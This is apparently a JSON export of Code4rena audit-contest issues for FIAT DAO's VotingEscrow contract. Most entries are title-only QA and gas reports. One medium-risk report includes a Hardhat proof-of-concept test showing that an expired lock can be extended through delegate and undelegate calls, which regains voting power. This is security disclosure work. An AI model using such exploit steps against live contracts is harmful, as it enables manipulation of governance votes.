"https://github.com/code-423n4/2022-08-fiatdao-findings/issues/259", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/258", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/257", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/256", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/255", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Inconsistent logic of increase unlock time to the expired locks", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/254", "labels": ["bug", "2 (Med Risk)", "high quality report", "sponsor confirmed"], "target": "2022-08-fiatdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L493-L523   # Vulnerability details  # [2022-08-fiatdao] Inconsistent logic of increase unlock time to the expired locks ## Impact Can not prevent expired locks being extended.  ## Proof of Concept https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L493-L523  Call function function `increaseUnlockTime()` with an expired lock (locked[msg.sender].end < block.timestamp) * Case 1: if sender's lock was not delegated to another address, function will be revert because of the requirement https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L511 * Case 2: if sender's lock was delegated to another address, function will not check anything and the lock can be extended.  But in case 1, sender\u2019s lock was not delegated to another, the sender can delegate to new address with end time of lock equal to new end time. After that he can call `increaseUnlockTime()` and move to case 2. Then sender can undelegate and the lock will be extended, and sender will take back vote power.  Here is the script : ``` typescript= describe(\"voting escrow\", async () => {     it(\"increase unlock time issue\", async () => {       await createSnapshot(provider);       //alice creates lock       let lockTime = WEEK + (await getTimestamp());       await ve.connect(alice).createLock(lockAmount, lockTime);       // bob creates lock       lockTime = 50 * WEEK + (await getTimestamp());       await ve.connect(bob).createLock(10 ** 8, lockTime);       //pass 1 week, alice's lock is expired       await ethers.provider.send(\"evm_mine\", [await getTimestamp() + WEEK]);       expect(await ve.balanceOf(alice.address)).to.eq(0);       //alice can not increase unlock timme       await expect(ve.connect(alice).increaseUnlockTime(lockTime)).to.be.revertedWith(\"Lock expired\");       //alice delegate to bob then can increase unlock time       await ve.connect(alice).delegate(bob.address);       await expect(ve.connect(alice).increaseUnlockTime(lockTime)).to.not.be.reverted;       //alice delegate back herself       await ve.connect(alice).delegate(alice.address);       expect(await ve.balanceOf(alice.address)).to.gt(0);     }); ```  ## Tools Used Manual review ## Recommended Mitigation Steps In every cases, expired locks should able to be extended -> should remove line https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L511 "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/252", "labels": ["bug", "G (Gas Optimization)", "high quality report"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/251", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/250", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/249", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/245", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/244", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/242", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/241", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/238", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Attackers can abuse the quitLock function to get a very large amount of votes", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/237", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "sponsor disputed"], "target": "2022-08-fiatdao-findings", "body": "Attackers can abuse the quitLock function to get a very large amount of votes"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/235", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/233", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Unsafe usage of ERC20 transfer and transferFrom ", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/231", "labels": ["bug", "3 (High Risk)", "sponsor disputed"], "target": "2022-08-fiatdao-findings", "body": "Unsafe usage of ERC20 transfer and transferFrom "}, {"title": "The current implementation of the VotingEscrow contract doesn't support fee on transfer tokens", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/229", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2022-08-fiatdao-findings", "body": "The current implementation of the VotingEscrow contract doesn't support fee on transfer tokens"}, {"title": "Unsafe casting from int128 can cause wrong accounting of locked amounts", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/228", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "sponsor acknowledged"], "target": "2022-08-fiatdao-findings", "body": "Unsafe casting from int128 can cause wrong accounting of locked amounts"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/226", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/225", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/223", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/222", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/220", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-fiatdao-findings", "body": "Gas Optimizations"}]